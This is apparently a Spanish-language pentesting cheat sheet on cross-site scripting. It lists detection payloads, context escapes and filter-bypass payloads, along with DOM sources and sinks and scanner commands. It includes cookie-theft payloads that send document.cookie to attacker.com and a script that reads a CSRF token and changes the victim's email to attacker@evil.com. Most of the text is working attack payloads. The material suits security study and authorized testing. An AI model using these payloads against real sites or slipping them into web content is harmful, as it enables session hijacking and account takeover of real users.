---
tags: [web, xss]
status: done
---

# XSS — Cross-Site Scripting

---

## Tipos

| Tipo | Dónde se almacena | Cuándo ejecuta |
|------|-------------------|----------------|
| Reflected | No (en URL/param) | Al visitar link |
| Stored | BBDD / servidor | Cada visita |
| DOM-based | Solo en cliente | JS procesa input |

---

## Detección — Payloads Básicos

```javascript
// Canary para detectar reflexión
"><h1>xss</h1>
'"><script>alert(1)</script>
javascript:alert(1)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Sin paréntesis (bypass filtros básicos)
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>
```

---

## Contextos y Escapes

```javascript
// En atributo HTML
<input value="INJECT">  → " onmouseover="alert(1)

// En atributo sin comillas
<input value=INJECT>    → onmouseover=alert(1)

// En bloque <script>
var x = "INJECT";       → "; alert(1);//

// En URL href
<a href="INJECT">       → javascript:alert(1)

// En template literal JS
var x = `INJECT`        → ${alert(1)}
```

---

## Filter Bypass

```javascript
// Etiqueta script filtrada → usar eventos
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

// Espacios filtrados → /
<img/src=x/onerror=alert(1)>

// Comillas filtradas → template literals o entidades HTML
<img src=x onerror=alert`1`>
<svg><script>alert&#40;1&#41;</script>

// "script" filtrado → case / unicode
<ScRiPt>alert(1)</ScRiPt>
<\x73cript>alert(1)</script>

// Doble encoding
%3Cscript%3Ealert(1)%3C/script%3E
```

---

## XSS Stored → Robo de Cookies

```javascript
// Payload que exfiltra cookie
<script>fetch('https://attacker.com/c?c='+document.cookie)</script>
<img src=x onerror="this.src='https://attacker.com/c?c='+document.cookie">

// Con XMLHttpRequest
<script>
var x = new XMLHttpRequest();
x.open('GET','https://attacker.com/c?c='+document.cookie);
x.send();
</script>
```

---

## DOM XSS — Sinks Peligrosos

```javascript
// Leer de fuentes (sources)
location.href / location.search / location.hash
document.referrer / document.cookie
window.name / postMessage

// Sinks peligrosos — si input acaba aquí sin sanitizar → DOM XSS
innerHTML         → document.getElementById('x').innerHTML = input
document.write()  → document.write(input)
eval()            → eval(input)
setTimeout/setInterval con string
jQuery $.html()   → $(selector).html(input)
```

```javascript
// Ejemplo DOM XSS via hash
// URL: https://target.com/page#<img src=x onerror=alert(1)>
var hash = location.hash.slice(1);
document.getElementById('content').innerHTML = hash;  // Sink
```

---

## XSS → Account Takeover (CSRF bypass)

```javascript
// Robar token CSRF y hacer petición autenticada
<script>
fetch('/profile/change-email').then(r=>r.text()).then(html=>{
  var token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
  fetch('/profile/change-email',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'email=attacker@evil.com&csrf_token='+token
  });
});
</script>
```

---

## Herramientas

```bash
# dalfox — scanner XSS moderno
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --blind https://attacker.com/

# ffuf para fuzzing de parámetros
ffuf -u "https://target.com/search?q=FUZZ" -w xss_payloads.txt -mr "alert"

# XSSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Burp Suite — Active Scan en el endpoint
```

